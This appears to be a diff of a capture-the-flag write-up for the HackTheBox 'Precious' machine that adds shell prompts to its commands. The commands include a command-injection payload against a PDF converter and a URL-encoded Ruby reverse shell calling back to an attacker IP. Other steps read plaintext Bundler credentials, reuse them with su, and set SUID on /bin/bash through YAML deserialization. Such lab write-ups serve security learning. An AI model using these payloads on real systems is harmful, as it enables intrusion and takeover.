@@ -20,8 +20,8 @@ Precious is an easy Linux box at `10.10.11.189`. The whole chain is dependency-d
 I started with a full TCP port sweep, then a versioned scan on the two open ports.
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.189
-nmap -p 22,80 -sCV 10.10.11.189
+$ nmap -p- --min-rate 10000 10.10.11.189
+$ nmap -p 22,80 -sCV 10.10.11.189
 ```
 
 ```
@@ -39,7 +39,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Two ports. SSH 8.4p1 on the `5+deb11u1` package put the host on Debian 11 bullseye. Port 80 was nginx 1.18.0, and the title told me the site wanted to redirect to `precious.htb`, so I added the vhost to my hosts file.
 
 ```bash
-echo '10.10.11.189 precious.htb' | sudo tee -a /etc/hosts
+$ echo '10.10.11.189 precious.htb' | sudo tee -a /etc/hosts
 ```
 
 Loading `http://precious.htb/` gave a single form with one input: paste a URL and the app converts that page to a PDF. The response headers were the first useful leak.
@@ -53,14 +53,14 @@ X-Runtime: Ruby
 `X-Powered-By: Phusion Passenger` plus `X-Runtime: Ruby` confirmed a Ruby app behind Passenger 6.0.15. A vhost fuzz turned up nothing new.
 
 ```bash
-ffuf -u http://10.10.11.189 -H "Host: FUZZ.precious.htb" \
+$ ffuf -u http://10.10.11.189 -H "Host: FUZZ.precious.htb" \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
 ```
 
 Feeding the form a public URL like `https://google.com` returned `cannot load remote url`. The converter could only reach hosts it could actually contact, so the target had to be something on my side. I stood up a Python server and pointed the form at it.
 
 ```bash
-python3 -m http.server 80
+$ python3 -m http.server 80
 ```
 
 ```
@@ -70,7 +70,7 @@ url=http://10.10.16.36/
 The form fetched my page and returned a generated PDF. The interesting part was not the rendered page, it was what the generator stamped into the file. Reading the PDF metadata with exiftool exposed the exact tool and version.
 
 ```bash
-exiftool generated.pdf
+$ exiftool generated.pdf
 ```
 
 ```
@@ -92,7 +92,7 @@ http://10.10.16.36/?name=%20`id`
 That confirmed execution, so I swapped in a reverse shell. I started a listener, then sent the crafted URL as the `url` value in a POST to `/`. The full request, URL-encoded, with a Ruby one-liner spawning `sh` back to me:
 
 ```bash
-curl 'http://precious.htb' -X POST \
+$ curl 'http://precious.htb' -X POST \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data-raw 'url=http%3A%2F%2F10.10.16.36%3A8484%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.16.36%22%2C8484%29%29%27%60'
 ```
@@ -125,7 +125,7 @@ reset
 The app ran as a low-privilege service user. The user flag and the next set of credentials lived under henry, so I went looking for a way across. Ruby's Bundler stores per-host package credentials in a config file, and that file was sitting in the home directory.
 
 ```bash
-cat ~/.bundle/config
+$ cat ~/.bundle/config
 ```
 
 ```
@@ -136,7 +136,7 @@ BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
 Plaintext `henry:Q3c1AqGHtoI0aXAYFH`. These are meant to authenticate to a private RubyGems repo, but the password was reused for the system account. `su` took it directly.
 
 ```bash
-su - henry
+$ su - henry
 # Password: Q3c1AqGHtoI0aXAYFH
 ```
 
@@ -200,17 +200,17 @@ The exploitation is the classic universal gadget chain for `Gem`/`Psych` deseria
 The `git_set` value is the injected command. I went with `chmod +s /bin/bash` to set the SUID bit rather than a reverse shell, since it leaves a reusable root primitive. Then I ran the sudo command from that same directory.
 
 ```bash
-cd /dev/shm
+$ cd /dev/shm
 # (dropped dependencies.yml here)
-sudo /usr/bin/ruby /opt/update_dependencies.rb
+$ sudo /usr/bin/ruby /opt/update_dependencies.rb
 ```
 
 It throws a harmless `sh: 1: reading: not found` from the half-built objects, but the gadget fires first and the command runs as root. `/bin/bash` came back SUID-root.
 
 ```bash
-ls -l /bin/bash
+$ ls -l /bin/bash
 # -rwsr-xr-x 1 root root ... /bin/bash
-bash -p
+$ bash -p
 ```
 
 ```
